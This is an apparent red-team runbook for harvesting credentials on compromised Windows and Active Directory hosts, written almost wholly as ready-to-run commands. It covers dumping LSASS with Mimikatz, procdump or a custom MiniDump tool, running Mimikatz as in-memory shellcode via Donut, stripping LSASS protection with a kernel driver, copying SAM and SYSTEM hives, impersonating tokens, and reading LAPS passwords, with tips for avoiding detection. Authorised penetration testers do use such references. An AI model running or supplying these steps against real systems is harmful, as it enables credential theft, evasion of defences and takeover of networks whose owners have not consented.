# Credential Harvesting Runbook

> Get creds. Everything else follows from creds.

---

## Decision Tree

```
Where am I?
├── SYSTEM/Admin on Windows → Dump LSASS (mimikatz, MiniDump)
│   └── kerberos/ + ntlm-relay/ for using what you find
├── Can force authentication (MSSQL, file share, web) → NTLM Relay
│   └── ntlm-relay/RUNBOOK.md
├── Domain environment → Kerberoast + AS-REP roast
│   └── kerberos/RUNBOOK.md
└── Linux host with AD → Steal Kerberos ccache/keytab
    └── 05-lateral-movement/linux/RUNBOOK.md
```

---

## Mimikatz (Most Comprehensive)

```
# From Meterpreter (in-memory, avoids disk)
load kiwi
creds_all              # dump everything at once
lsa_dump_sam           # SAM hashes
lsa_dump_secrets       # LSA secrets (service account creds)
```

**Via Donut (run Mimikatz.exe as shellcode in memory):**
```bash
# On Kali — convert Mimikatz to shellcode
python3 04-encoders/donut/donut.py -f 1 -i Mimikatz.exe -o mimi.bin
# Then load into loader and execute
```

**Bypass LSA Protection (if lsass is PPL-protected):**
```
mimikatz# !+                                    # load mimidrv.sys driver
mimikatz# !processprotect /process:lsass.exe /remove
mimikatz# sekurlsa::logonpasswords
```

---

## LSASS Dump (Without Mimikatz on Target)

```cmd
# Task Manager method (GUI, no tools needed)
# Task Manager → Details → lsass.exe → Create dump file

# ProcDump (Sysinternals, signed binary — less likely to trigger)
.\procdump.exe -ma lsass.exe lsass.dmp

# MiniDump.cs / MiniDump.ps1 (custom, from credentials/)
.\MiniDump.exe         # outputs lsass.dmp in current dir
```

**Parse dump on Kali:**
```bash
# Via Mimikatz
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

# Via pypykatz
pypykatz lsa minidump lsass.dmp
```

---

## SAM Database Extraction

```cmd
# Shadow copy method (requires admin)
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\system

# Registry method
reg save HKLM\sam C:\sam
reg save HKLM\system C:\system
```

**Decrypt on Kali:**
```bash
python3 /usr/share/creddump7/pwdump.py system sam
```

---

## Token Impersonation (Meterpreter)

```
use incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"
getuid                    # verify new identity
```

**Requires:** `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`

---

## LAPS Passwords

```powershell
# Read if you have permission
Import-Module .\LAPSToolkit.ps1
Get-LAPSComputers                          # all computers + passwords
Find-LAPSDelegatedGroups                   # who can read LAPS
```

---

## Files in This Section

| File | Purpose |
|------|---------|
| `mimikatz.md` | Mimikatz quick reference |
| `kerberos/` | Kerberoasting, AS-REP roasting, ticket attacks |
| `ntlm-relay/` | Responder, ntlmrelayx, NTLM capture |
